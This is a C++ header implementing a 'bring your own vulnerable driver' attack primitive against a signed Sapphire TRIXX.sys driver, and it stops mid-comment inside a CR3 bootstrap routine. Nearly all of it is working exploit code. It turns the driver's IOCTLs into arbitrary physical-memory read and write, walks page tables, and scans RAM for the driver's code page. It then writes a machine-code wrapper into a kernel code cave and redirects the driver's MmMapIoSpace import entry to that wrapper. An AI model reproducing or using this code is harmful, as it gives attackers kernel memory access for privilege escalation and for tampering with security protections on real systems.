#pragma once
// primitive_trixx.hpp
// Sapphire TRIXX.sys BYOVD primitive (TechPowerUp, signed DigiCert EV)
// Device: \\.\TrixxSvc (dynamic — matches service name from DriverEntry)
// IOCTLs:
//   0x80006498 (phys read 1/2/4/8 bytes)
//   0x8000649C (phys write 1/2/4/8 bytes)
// CR3 bootstrap: PML4 self-reference scan (no EPROCESS offset dependency)

#include "mapper.hpp"
#include <Windows.h>
#include <cstdarg>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <memory>
#include <algorithm>
#include <iostream>
#include <vector>

#ifdef min
#undef min
#endif

static constexpr DWORD TRIXX_IOCTL_READ_MEM  = 0x80006498;
static constexpr DWORD TRIXX_IOCTL_WRITE_MEM = 0x8000649C;

// ── Physical read: driver only accepts sizes 1, 2, 4, 8 ──────────
static bool TrixxPhysRead(HANDLE h, uint64_t pa, void* dst, uint32_t sz) {
    if (sz != 1 && sz != 2 && sz != 4 && sz != 8) return false;
    uint8_t buf[8] = {};
    DWORD got = 0;
    uint64_t addr = pa;
    if (!DeviceIoControl(h, TRIXX_IOCTL_READ_MEM,
                         &addr, sizeof(addr),
                         buf, sz, &got, nullptr))
        return false;
    if (got != sz) return false;
    memcpy(dst, buf, sz);
    return true;
}

// ── Physical write: driver only accepts sizes 1, 2, 4, 8 ─────────
static bool TrixxPhysWrite(HANDLE h, uint64_t pa, const void* src, uint32_t sz) {
    if (sz != 1 && sz != 2 && sz != 4 && sz != 8) return false;
    uint8_t input[16] = {};
    memcpy(input, &pa, 8);
    memcpy(input + 8, src, sz);
    DWORD got = 0;
    return DeviceIoControl(h, TRIXX_IOCTL_WRITE_MEM,
                           input, 8 + sz,
                           nullptr, 0, &got, nullptr) != 0;
}

static uint64_t TrixxRead8(HANDLE h, uint64_t pa) {
    uint64_t v = 0;
    TrixxPhysRead(h, pa, &v, 8);
    return v;
}

// Bulk physical read: reads arbitrary sizes via 8/4/2/1-byte IOCTLs
static bool TrixxPhysReadBulk(HANDLE h, uint64_t pa, void* dst, size_t n) {
    auto* d = (uint8_t*)dst;
    size_t off = 0;
    while (off + 8 <= n) {
        if (!TrixxPhysRead(h, pa + off, d + off, 8)) return false;
        off += 8;
    }
    if (off + 4 <= n) {
        if (!TrixxPhysRead(h, pa + off, d + off, 4)) return false;
        off += 4;
    }
    if (off + 2 <= n) {
        if (!TrixxPhysRead(h, pa + off, d + off, 2)) return false;
        off += 2;
    }
    if (off < n) {
        if (!TrixxPhysRead(h, pa + off, d + off, 1)) return false;
    }
    return true;
}

// ── 4-level page table walk ──────────────────────────────────────
// PTE physical address mask: bits [51:12], strips NX (63) and other flags
static constexpr uint64_t PTE_ADDR_MASK = 0x000FFFFFFFFFF000ULL;
static constexpr uint64_t PDE_2MB_ADDR_MASK = 0x000FFFFFFFE00000ULL;
static constexpr uint64_t PDPTE_1GB_ADDR_MASK = 0x000FFFFFC0000000ULL;

static uint64_t TrixxVirtToPhys(HANDLE h, uint64_t cr3, uint64_t va) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };

    uint64_t pml4e = TrixxRead8(h, (cr3 & PTE_ADDR_MASK) + idx(39) * 8);
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte = TrixxRead8(h, (pml4e & PTE_ADDR_MASK) + idx(30) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);

    uint64_t pde = TrixxRead8(h, (pdpte & PTE_ADDR_MASK) + idx(21) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);

    uint64_t pte = TrixxRead8(h, (pde & PTE_ADDR_MASK) + idx(12) * 8);
    if (!(pte & 1)) return 0;
    return (pte & PTE_ADDR_MASK) | (va & 0xFFF);
}

// ── Safe physical RAM range query ────────────────────────────────
struct PhysRange { uint64_t lo, hi; };

static bool IsInSafeRange(uint64_t addr, const std::vector<PhysRange>& ranges) {
    for (auto& r : ranges)
        if (addr >= r.lo && addr < r.hi) return true;
    return false;
}

// Page-table walk that checks every address against safe RAM ranges
static uint64_t TrixxVirtToPhysSafe(HANDLE h, uint64_t cr3,
        uint64_t va, const std::vector<PhysRange>& ranges) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };

    uint64_t a0 = (cr3 & PTE_ADDR_MASK) + idx(39) * 8;
    if (!IsInSafeRange(a0, ranges)) return 0;
    uint64_t pml4e = TrixxRead8(h, a0);
    if (!(pml4e & 1)) return 0;

    uint64_t a1 = (pml4e & PTE_ADDR_MASK) + idx(30) * 8;
    if (!IsInSafeRange(a1, ranges)) return 0;
    uint64_t pdpte = TrixxRead8(h, a1);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);

    uint64_t a2 = (pdpte & PTE_ADDR_MASK) + idx(21) * 8;
    if (!IsInSafeRange(a2, ranges)) return 0;
    uint64_t pde = TrixxRead8(h, a2);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);

    uint64_t a3 = (pde & PTE_ADDR_MASK) + idx(12) * 8;
    if (!IsInSafeRange(a3, ranges)) return 0;
    uint64_t pte = TrixxRead8(h, a3);
    if (!(pte & 1)) return 0;
    return (pte & PTE_ADDR_MASK) | (va & 0xFFF);
}


// Raw walk without safe range checks — for CR3 verification only
static uint64_t TrixxVirtToPhysRaw(HANDLE h, uint64_t cr3, uint64_t va, uint64_t maxPhys = 0) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };
    auto inRange = [&](uint64_t pa) { return !maxPhys || (pa && pa < maxPhys); };

    uint64_t pml4e = TrixxRead8(h, (cr3 & PTE_ADDR_MASK) + idx(39) * 8);
    if (!(pml4e & 1)) return 0;
    if (!inRange(pml4e & PTE_ADDR_MASK)) return 0;

    uint64_t pdpte = TrixxRead8(h, (pml4e & PTE_ADDR_MASK) + idx(30) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);
    if (!inRange(pdpte & PTE_ADDR_MASK)) return 0;

    uint64_t pde = TrixxRead8(h, (pdpte & PTE_ADDR_MASK) + idx(21) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);
    if (!inRange(pde & PTE_ADDR_MASK)) return 0;

    uint64_t pte = TrixxRead8(h, (pde & PTE_ADDR_MASK) + idx(12) * 8);
    if (!(pte & 1)) return 0;
    return (pte & PTE_ADDR_MASK) | (va & 0xFFF);
}

// Diagnostic walk: logs every level (uses printf since dlog is scoped to bootstrap)
static uint64_t TrixxVirtToPhysDiagRaw(HANDLE h, uint64_t cr3, uint64_t va, FILE* out = nullptr) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };
    auto dw = [&](const char* fmt, ...) {
        va_list ap; va_start(ap, fmt);
        vprintf(fmt, ap);
        if (out) { va_start(ap, fmt); vfprintf(out, fmt, ap); }
        va_end(ap);
    };

    uint64_t a0 = (cr3 & PTE_ADDR_MASK) + idx(39) * 8;
    uint64_t pml4e = TrixxRead8(h, a0);
    dw("[*]     walk: PML4[%llu] @0x%llx = 0x%llx\n",
       idx(39), (unsigned long long)a0, (unsigned long long)pml4e);
    if (!(pml4e & 1)) return 0;

    uint64_t a1 = (pml4e & PTE_ADDR_MASK) + idx(30) * 8;
    uint64_t pdpte = TrixxRead8(h, a1);
    dw("[*]     walk: PDPT[%llu] @0x%llx = 0x%llx (PS=%d)\n",
       idx(30), (unsigned long long)a1, (unsigned long long)pdpte, !!(pdpte & (1<<7)));
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) {
        uint64_t r = (pdpte & PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);
        dw("[*]     walk: 1GB => 0x%llx\n", (unsigned long long)r);
        return r;
    }

    uint64_t a2 = (pdpte & PTE_ADDR_MASK) + idx(21) * 8;
    uint64_t pde = TrixxRead8(h, a2);
    dw("[*]     walk: PDE[%llu] @0x%llx = 0x%llx (PS=%d)\n",
       idx(21), (unsigned long long)a2, (unsigned long long)pde, !!(pde & (1<<7)));
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) {
        uint64_t r = (pde & PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);
        dw("[*]     walk: 2MB => 0x%llx\n", (unsigned long long)r);
        return r;
    }

    uint64_t a3 = (pde & PTE_ADDR_MASK) + idx(12) * 8;
    uint64_t pte = TrixxRead8(h, a3);
    dw("[*]     walk: PTE[%llu] @0x%llx = 0x%llx\n",
       idx(12), (unsigned long long)a3, (unsigned long long)pte);
    if (!(pte & 1)) return 0;
    uint64_t r = (pte & PTE_ADDR_MASK) | (va & 0xFFF);
    dw("[*]     walk: 4KB => 0x%llx\n", (unsigned long long)r);
    return r;
}

static std::vector<PhysRange> GetSafePhysRanges() {
    std::vector<PhysRange> ranges;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return ranges;

    DWORD dataSize = 0, type = 0;
    RegQueryValueExA(hKey, ".Translated", NULL, &type, NULL, &dataSize);
    auto data = std::make_unique<BYTE[]>(dataSize);
    if (RegQueryValueExA(hKey, ".Translated", NULL, &type, data.get(), &dataSize)
            != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return ranges;
    }
    RegCloseKey(hKey);

    if (dataSize < 20) return ranges;
    auto* p = data.get();
    ULONG listCount = *(ULONG*)p; p += 4;

    for (ULONG i = 0; i < listCount && p < data.get() + dataSize; i++) {
        p += 8; // InterfaceType + BusNumber
        p += 4; // Version + Revision
        ULONG descCount = *(ULONG*)p; p += 4;

        for (ULONG j = 0; j < descCount && p + 20 <= data.get() + dataSize; j++) {
            UCHAR resType = p[0];
            USHORT flags  = *(USHORT*)(p + 2);
            uint64_t start = *(uint64_t*)(p + 4);
            uint64_t length = *(uint32_t*)(p + 12);
            p += 20; // 64-bit descriptor size

            if (resType == 3) { // CmResourceTypeMemory
                if (length > 0)
                    ranges.push_back({ start, start + length });
            } else if (resType == 7) { // CmResourceTypeMemoryLarge
                if (flags & 0x0200)      length <<= 8;
                else if (flags & 0x0400) length <<= 16;
                else if (flags & 0x0800) length <<= 32;
                if (length > 0)
                    ranges.push_back({ start, start + length });
            }
        }
    }
    return ranges;
}

// Diagnostic page table walk — logs which level fails
static uint64_t TrixxVirtToPhysDiag(HANDLE h, uint64_t cr3, uint64_t va) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };

    uint64_t pml4e = TrixxRead8(h, (cr3 & PTE_ADDR_MASK) + idx(39) * 8);
    if (!(pml4e & 1)) {
        printf("[*]       PML4[%llu] not present\n", idx(39));
        return 0;
    }

    uint64_t pdpte = TrixxRead8(h, (pml4e & PTE_ADDR_MASK) + idx(30) * 8);
    if (!(pdpte & 1)) {
        printf("[*]       PDPT[%llu] not present (PML4e->0x%llx)\n", idx(30),
             (unsigned long long)(pml4e & PTE_ADDR_MASK));
        return 0;
    }
    if (pdpte & (1ULL << 7)) return (pdpte & PDPTE_1GB_ADDR_MASK) | (va & 0x3FFFFFFF);

    uint64_t pde = TrixxRead8(h, (pdpte & PTE_ADDR_MASK) + idx(21) * 8);
    if (!(pde & 1)) {
        printf("[*]       PD[%llu] not present (PDPTe->0x%llx)\n", idx(21),
             (unsigned long long)(pdpte & PTE_ADDR_MASK));
        return 0;
    }
    if (pde & (1ULL << 7)) return (pde & PDE_2MB_ADDR_MASK) | (va & 0x1FFFFF);

    uint64_t pte = TrixxRead8(h, (pde & PTE_ADDR_MASK) + idx(12) * 8);
    if (!(pte & 1)) {
        printf("[*]       PT[%llu] not present (PDe->0x%llx)\n", idx(12),
             (unsigned long long)(pde & PTE_ADDR_MASK));
        return 0;
    }
    return (pte & PTE_ADDR_MASK) | (va & 0xFFF);
}

// ── TRIXX read strategy: IAT redirect for MmCached ─────────────
// MmMapIoSpace(MmNonCached) FAILS for page table PFNs — Windows
// HAL rejects UC re-mapping of pages already mapped WB (cache
// aliasing). Fix: parse TRIXX PE import table from disk to find
// MmMapIoSpace IAT slot, redirect to wrapper forcing MmCached.
// IAT is data (D-cache coherent), so the redirect takes effect
// immediately without I-cache flush.
static uint64_t g_trixxPatchPA = 0;
static uint64_t g_trixxIatPA = 0;
static bool     g_trixxPatched = false;

static void TrixxFlushCaches() {
    auto* fb = (volatile uint8_t*)VirtualAlloc(nullptr, 128*1024*1024,
                                                MEM_COMMIT, PAGE_READWRITE);
    if (fb) {
        for (size_t i = 0; i < 128*1024*1024; i += 64) (void)fb[i];
        VirtualFree((void*)fb, 0, MEM_RELEASE);
    }
}

// ── PE import table parser: find MmMapIoSpace IAT slot RVA ──────
struct TrixxPEInfo {
    uint32_t iatSlotRVA;
    uint32_t iatPageOffset;
    uint32_t handlerPageRVA;
    bool valid;
};

static TrixxPEInfo ParseTrixxPEForIAT(const char* path, FILE* diag = nullptr) {
    TrixxPEInfo info = {};
    auto dlog = [&](const char* fmt, ...) {
        va_list ap; va_start(ap, fmt);
        if (diag) { vfprintf(diag, fmt, ap); fflush(diag); }
        va_end(ap);
        va_start(ap, fmt);
        vprintf(fmt, ap);
        va_end(ap);
        fflush(stdout);
    };

    FILE* f = fopen(path, "rb");
    if (!f) { dlog("[-] PE parse: cannot open %s\n", path); return info; }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz < 0 || sz > 1024*1024) { fclose(f); return info; }
    auto buf = std::make_unique<uint8_t[]>(sz);
    fread(buf.get(), 1, sz, f);
    fclose(f);
    auto* d = buf.get();

    if (sz < 0x40 || *(uint16_t*)d != 0x5A4D) return info;
    uint32_t peOff = *(uint32_t*)(d + 0x3C);
    if (peOff + 4 > (uint32_t)sz || *(uint32_t*)(d + peOff) != 0x4550) return info;

    uint8_t* coff = d + peOff + 4;
    uint16_t nSect = *(uint16_t*)(coff + 2);
    uint16_t optSz = *(uint16_t*)(coff + 16);
    uint8_t* opt = coff + 20;
    if (*(uint16_t*)opt != 0x20B) return info;

    uint32_t nDD = *(uint32_t*)(opt + 108);
    uint8_t* ddBase = opt + 112;

    struct Sect { uint32_t rva, vsz, roff, rsz; };
    std::vector<Sect> sects(nSect);
    uint8_t* sh = opt + optSz;
    for (uint16_t i = 0; i < nSect; i++) {
        uint8_t* s = sh + i * 40;
        sects[i] = { *(uint32_t*)(s+12), *(uint32_t*)(s+8),
                     *(uint32_t*)(s+20), *(uint32_t*)(s+16) };
    }

    auto r2f = [&](uint32_t rva) -> uint32_t {
        for (auto& s : sects)
            if (rva >= s.rva && rva < s.rva + (std::max)(s.vsz, s.rsz))
                return s.roff + (rva - s.rva);
        return 0;
    };

    // Find handler signature to determine which .text page it's on
    const uint8_t handlerSig[] = { 0x45, 0x33, 0xC0, 0x8B, 0xD3, 0xFF, 0x15 };
    for (auto& s : sects) {
        for (uint32_t i = 0; i + sizeof(handlerSig) <= s.rsz; i++) {
            if (memcmp(d + s.roff + i, handlerSig, sizeof(handlerSig)) == 0) {
                uint32_t rva = s.rva + i;
                info.handlerPageRVA = rva & ~0xFFFu;
                dlog("[*] PE: handler sig at RVA 0x%x (page 0x%x)\n", rva, info.handlerPageRVA);
                break;
            }
        }
        if (info.handlerPageRVA) break;
    }

    if (nDD < 2) return info;
    uint32_t impRVA = *(uint32_t*)(ddBase + 8);
    uint32_t impFoff = r2f(impRVA);
    if (!impFoff) return info;

    for (uint32_t dOff = impFoff; dOff + 20 <= (uint32_t)sz; dOff += 20) {
        uint32_t iltRVA  = *(uint32_t*)(d + dOff);
        uint32_t nameRVA = *(uint32_t*)(d + dOff + 12);
        uint32_t iatRVA  = *(uint32_t*)(d + dOff + 16);
        if (!iltRVA && !nameRVA && !iatRVA) break;

        uint32_t nf = r2f(nameRVA);
        if (!nf || _strnicmp((char*)(d + nf), "ntoskrnl", 8) != 0) continue;

        uint32_t iltF = r2f(iltRVA);
        if (!iltF) continue;
        uint32_t iatE = iatRVA;
        for (int idx = 0; ; idx++) {
            if (iltF + idx * 8 + 8 > (uint32_t)sz) break;
            uint64_t e = *(uint64_t*)(d + iltF + idx * 8);
            if (!e) break;
            if (!(e & (1ULL << 63))) {
                uint32_t hf = r2f((uint32_t)(e & 0x7FFFFFFF));
                if (hf && hf + 14 < (uint32_t)sz &&
                    strcmp((char*)(d + hf + 2), "MmMapIoSpace") == 0) {
                    info.iatSlotRVA = iatE;
                    info.iatPageOffset = iatE & 0xFFF;
                    info.valid = true;
                    dlog("[+] PE: MmMapIoSpace IAT slot RVA=0x%x (page offset 0x%x)\n",
                         info.iatSlotRVA, info.iatPageOffset);
                    return info;
                }
            }
            iatE += 8;
        }
    }
    dlog("[-] PE: MmMapIoSpace not found in imports\n");
    return info;
}

static bool TrixxPatchCachedReads(HANDLE h, const std::vector<PhysRange>& ranges,
                                   uint64_t ntkrnlVA, FILE* diag = nullptr) {
    auto dlog = [&](const char* fmt, ...) {
        va_list ap; va_start(ap, fmt);
        if (diag) { vfprintf(diag, fmt, ap); fflush(diag); }
        va_end(ap);
        va_start(ap, fmt);
        vprintf(fmt, ap);
        va_end(ap);
        fflush(stdout);
    };

    // ── Resolve MmMapIoSpace kernel VA ──
    uint64_t mmMapVA = 0;
    {
        HMODULE hNt = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (hNt) {
            auto* pMm = (uint8_t*)GetProcAddress(hNt, "MmMapIoSpace");
            if (pMm) mmMapVA = ntkrnlVA + (uint64_t)(pMm - (uint8_t*)hNt);
            FreeLibrary(hNt);
        }
    }
    if (!mmMapVA) { dlog("[-] Cannot resolve MmMapIoSpace VA\n"); return false; }
    dlog("[*] MmMapIoSpace VA=0x%llx\n", (unsigned long long)mmMapVA);

    // ── Find TRIXX.sys base VA from loaded modules ──
    uint64_t trixxBaseVA = 0;
    {
        typedef NTSTATUS (NTAPI *pNtQSI)(ULONG, PVOID, ULONG, PULONG);
        auto NtQSI = (pNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                             "NtQuerySystemInformation");
        if (NtQSI) {
            ULONG needed = 0;
            NtQSI(11, nullptr, 0, &needed);
            auto mbuf = std::make_unique<uint8_t[]>(needed);
            if (NtQSI(11, mbuf.get(), needed, &needed) == 0) {
                struct MOD_INFO {
                    PVOID Section; PVOID MappedBase; PVOID ImageBase;
                    ULONG ImageSize; ULONG Flags;
                    USHORT LoadOrderIndex; USHORT InitOrderIndex;
                    USHORT LoadCount; USHORT OffsetToFileName;
                    CHAR FullPathName[256];
                };
                ULONG mc = *(ULONG*)mbuf.get();
                for (ULONG i = 0; i < mc; i++) {
                    auto* m = (MOD_INFO*)(mbuf.get() + 8 + i * sizeof(MOD_INFO));
                    const char* nm = m->FullPathName + m->OffsetToFileName;
                    if (_stricmp(nm, "TRIXX.sys") == 0) {
                        trixxBaseVA = (uint64_t)m->ImageBase;
                        dlog("[*] TRIXX.sys base VA=0x%llx size=0x%x\n",
                             (unsigned long long)trixxBaseVA, m->ImageSize);
                        break;
                    }
                }
            }
        }
    }
    if (!trixxBaseVA) { dlog("[-] TRIXX.sys not in loaded modules\n"); return false; }

    // ── Parse PE from disk to find IAT slot RVA ──
    char selfPath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, selfPath, MAX_PATH);
    char* ls = strrchr(selfPath, '\\');
    if (ls) *(ls + 1) = 0;

    std::string trixxPath;
    {
        char tmpDir[MAX_PATH] = {};
        GetTempPathA(MAX_PATH, tmpDir);
        std::string candidates[] = {
            std::string(selfPath) + "TRIXX.sys",
            std::string(tmpDir) + "TRIXX.sys",
        };
        for (auto& c : candidates)
            if (GetFileAttributesA(c.c_str()) != INVALID_FILE_ATTRIBUTES) { trixxPath = c; break; }
    }

    TrixxPEInfo peInfo = {};
    if (!trixxPath.empty()) {
        dlog("[*] Parsing PE: %s\n", trixxPath.c_str());
        peInfo = ParseTrixxPEForIAT(trixxPath.c_str(), diag);
    }
    if (!peInfo.valid) {
        dlog("[-] PE parse failed — using hardcoded IAT offset 0x088 (RVA 0x3088)\n");
        peInfo.iatSlotRVA = 0x3088;
        peInfo.iatPageOffset = 0x088;
        peInfo.handlerPageRVA = 0x2000;
        peInfo.valid = true;
    }

    uint32_t iatSlotOff = peInfo.iatPageOffset;
    uint32_t iatPageRVA = peInfo.iatSlotRVA & ~0xFFFu;
    int32_t textToIatDelta = (int32_t)iatPageRVA - (int32_t)peInfo.handlerPageRVA;
    dlog("[*] PE: IAT slot RVA=0x%x pageOff=0x%x handlerPage=0x%x delta=%+d\n",
         peInfo.iatSlotRVA, iatSlotOff, peInfo.handlerPageRVA, textToIatDelta);

    // ── Flush CPU caches so physical scan sees current DRAM ──
    TrixxFlushCaches();

    // ── Scan for .text handler page (code signature) ──
    const uint64_t HANDLER_SIG_ORIG    = 0x0EBE15FFD38BC033ULL;
    const uint64_t HANDLER_SIG_PATCHED = 0x0EBE15FF000003EDULL;
    const uint32_t SIG_OFFSET = 0x1C0;

    uint64_t wrapperVA = trixxBaseVA + 0x25C0;

    dlog("[*] Scanning for TRIXX .text handler page...\n");
    dlog("[*]   mmMapVA=0x%llx wrapperVA=0x%llx\n",
         (unsigned long long)mmMapVA, (unsigned long long)wrapperVA);
    uint64_t textPagePA = 0;
    for (auto& r : ranges) {
        uint64_t lo = (r.lo + 0xFFF) & ~0xFFFULL;
        uint64_t hi = r.hi & ~0xFFFULL;
        for (uint64_t pa = lo; pa < hi; pa += 0x1000) {
            if ((pa & 0xFFFFFFF) == 0)
                dlog("[*]   scan: 0x%llx\n", (unsigned long long)pa);
            uint64_t val = TrixxRead8(h, pa + SIG_OFFSET);
            if (val == HANDLER_SIG_ORIG || val == HANDLER_SIG_PATCHED) {
                const char* tag = (val == HANDLER_SIG_ORIG) ? "original" : "prev-patched";
                dlog("[+] .text page at PA 0x%llx (%s)\n", (unsigned long long)pa, tag);
                textPagePA = pa;
                break;
            }
        }
        if (textPagePA) break;
    }
    if (!textPagePA) { dlog("[-] TRIXX .text page not found\n"); return false; }
    g_trixxPatchPA = textPagePA;

    // ── Compute IAT page PA from PE-derived delta ──
    uint64_t iatPagePA = textPagePA + textToIatDelta;
    dlog("[*] IAT page PA = textPage 0x%llx + delta %+d = 0x%llx\n",
         (unsigned long long)textPagePA, textToIatDelta, (unsigned long long)iatPagePA);

    // Read current IAT slot value for diagnostics
    uint64_t iatCurVal = TrixxRead8(h, iatPagePA + iatSlotOff);
    dlog("[*] IAT slot @0x%llx current value: 0x%llx\n",
         (unsigned long long)(iatPagePA + iatSlotOff), (unsigned long long)iatCurVal);
    if (iatCurVal == mmMapVA) dlog("[*]   (resolved MmMapIoSpace — original)\n");
    else if (iatCurVal == wrapperVA) dlog("[*]   (already points to our wrapper)\n");
    else if (iatCurVal == 0xA368) dlog("[*]   (unresolved PE RVA — DRAM stale, WB cache has real VA)\n");
    else dlog("[*]   (unexpected value — will overwrite)\n");

    bool iatAlreadyPatched = (iatCurVal == wrapperVA);

    // ── Write MmCached wrapper into code cave ──
    // Wrapper at textPage+0x5C0 (RVA 0x25C0, in .text padding):
    //   mov r8d, 1           ; MmCached (forces WB mapping)
    //   mov rax, mmMapVA     ; real MmMapIoSpace
    //   jmp rax              ; tail call
    if (!iatAlreadyPatched) {
        uint8_t wrapper[18] = {
            0x41, 0xB8, 0x01, 0x00, 0x00, 0x00,   // mov r8d, 1 (MmCached)
            0x48, 0xB8, 0,0,0,0,0,0,0,0,           // mov rax, mmMapVA
            0xFF, 0xE0                               // jmp rax
        };
        memcpy(wrapper + 8, &mmMapVA, 8);

        bool wOk = true;
        for (int i = 0; i < 18 && wOk; i++)
            wOk = TrixxPhysWrite(h, textPagePA + 0x5C0 + i, &wrapper[i], 1);
        if (!wOk) {
            dlog("[-] IAT wrapper write failed\n");
            return false;
        }
        dlog("[+] Wrapper written at textPage+0x5C0: mov r8d,1; mov rax,MmMapIoSpace; jmp rax\n");

        // ── Redirect IAT slot to wrapper ──
        for (int i = 0; i < 8; i++) {
            uint8_t b = (uint8_t)(wrapperVA >> (i * 8));
            if (!TrixxPhysWrite(h, iatPagePA + iatSlotOff + i, &b, 1)) {
                dlog("[-] IAT slot write failed at byte %d\n", i);
                return false;
            }
        }
        dlog("[+] IAT redirected: MmMapIoSpace → wrapper 0x%llx\n",
             (unsigned long long)wrapperVA);

        // Post-write cache flush: evict WB cache line holding old mmMapVA
        TrixxFlushCaches();
        dlog("[*] Post-IAT cache flush done\n");
    } else {
        dlog("[+] IAT already redirected to wrapper — verifying MmCached\n");
    }

    // ── Verify: read back wrapper and IAT slot ──
    uint8_t wVfy[6] = {};
    TrixxPhysReadBulk(h, textPagePA + 0x5C0, wVfy, 6);
    dlog("[*] Wrapper verify @+0x5C0: %02x %02x %02x %02x %02x %02x (expect 41 B8 01 00 00 00)\n",
         wVfy[0], wVfy[1], wVfy[2], wVfy[3], wVfy[4], wVfy[5]);
    bool wrapperOk = (wVfy[0] == 0x41 && wVfy[1] == 0xB8 && wVfy[2] == 0x01);

    uint64_t iatVfy = TrixxRead8(h, iatPagePA + iatSlotOff);
    dlog("[*] IAT verify: 0x%llx (expect 0x%llx) %s\n",
         (unsigned long long)iatVfy, (unsigned long long)wrapperVA,
         iatVfy == wrapperVA ? "OK" : "MISMATCH");

    // Ensure MmCached: fix wrapper if r8d was set to 0 by prior UC patch
    if (wVfy[2] == 0x00 && wVfy[0] == 0x41 && wVfy[1] == 0xB8) {
        uint8_t one = 0x01;
        TrixxPhysWrite(h, textPagePA + 0x5C2, &one, 1);
        dlog("[+] Fixed wrapper: mov r8d,0 -> mov r8d,1 (MmCached)\n");
        wrapperOk = true;
    }

    g_trixxPatched = wrapperOk && (iatVfy == wrapperVA);
    g_trixxPatchPA = textPagePA;
    g_trixxIatPA = iatPagePA;

    if (g_trixxPatched)
        dlog("[+] TRIXX reads now use MmCached — page table walks should succeed\n");
    else
        dlog("[!] IAT patch verification failed — reads may still use MmNonCached\n");

    return g_trixxPatched;
}

// ── CR3 bootstrap ───────────────────────────────────────────────
// Phase 1: EPROCESS scan    — find System + other processes via physical pattern match
// Phase 2: DTB walk — walk ntkrnlVA through each DTB ±8
// Phase 3: Self-ref PTE scan — find PML4 self-referencing entry
// Phase 4: Brute-force PML4 scan — try every page as CR3
static uint64_t TrixxBootstrapCR3(HANDLE h) {
    FILE* diag = fopen("trixx_diag.log", "w");
    auto dlog = [&](const char* fmt, ...) {
        va_list ap; va_start(ap, fmt);
        if (diag) { vfprintf(diag, fmt, ap); fflush(diag); }
        va_end(ap);
        va_start(ap, fmt);
        vprintf(fmt, ap);
        va_end(ap);
        fflush(stdout);
    };

    dlog("[*] TrixxBootstrapCR3 starting (PE-based IAT patch for MmCached)\n");

    // 64-bit address capability test
    uint64_t val_0 = TrixxRead8(h, 0x0);
    uint64_t val_4G = TrixxRead8(h, 0x100000000ULL);
    dlog("[*] 64-bit test: @0x0=0x%016llx @0x100000000=0x%016llx %s\n",
         val_0, val_4G, val_0 == val_4G ? "TRUNCATED!" : "OK");
    if (val_0 == val_4G) {
        dlog("[!] TRIXX truncates to 32-bit — cannot work on >4GB systems\n");
    }

    // ntoskrnl base VA
    typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
    auto NtQSI = (pNtQuerySystemInformation)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) { dlog("[-] NtQSI not found\n"); if (diag) fclose(diag); return 0; }

    ULONG needed = 0;
    NtQSI(11, nullptr, 0, &needed);
    auto buf = std::make_unique<uint8_t[]>(needed);
    if (NtQSI(11, buf.get(), needed, &needed) != 0) {
        dlog("[-] NtQSI(11) failed\n"); if (diag) fclose(diag); return 0;
    }

    struct RTL_PROCESS_MODULE_INFORMATION {
        PVOID Section; PVOID MappedBase; PVOID ImageBase;
        ULONG ImageSize; ULONG Flags;
        USHORT LoadOrderIndex; USHORT InitOrderIndex;
        USHORT LoadCount; USHORT OffsetToFileName;
        CHAR FullPathName[256];
    };
    ULONG moduleCount = *(ULONG*)buf.get();
    if (!moduleCount) { dlog("[-] No modules\n"); if (diag) fclose(diag); return 0; }
    auto* mod0 = (RTL_PROCESS_MODULE_INFORMATION*)(buf.get() + 8);
    uint64_t ntkrnlVA = (uint64_t)mod0->ImageBase;
    int ntkrnlPml4Idx = (int)((ntkrnlVA >> 39) & 0x1FF);
    dlog("[*] ntoskrnl: VA=0x%llx PML4[%d]\n", ntkrnlVA, ntkrnlPml4Idx);

    auto ranges = GetSafePhysRanges();
    if (ranges.empty()) { dlog("[-] No phys ranges\n"); if (diag) fclose(diag); return 0; }
    dlog("[*] %zu RAM ranges:\n", ranges.size());
    for (size_t i = 0; i < ranges.size(); i++)
        dlog("[*]   %zu: 0x%llx-0x%llx (%llu MB)\n", i,
             ranges[i].lo, ranges[i].hi, (ranges[i].hi - ranges[i].lo) >> 20);

    uint64_t maxPhys = ranges.back().hi + 0x10000000ULL;

    // Patch TRIXX IAT to use MmCached reads (required for page table PFNs).
    // MmMapIoSpace(MmNonCached) fails for page table pages due to cache
    // aliasing — HAL rejects UC mapping of WB-mapped PFNs. The IAT redirect
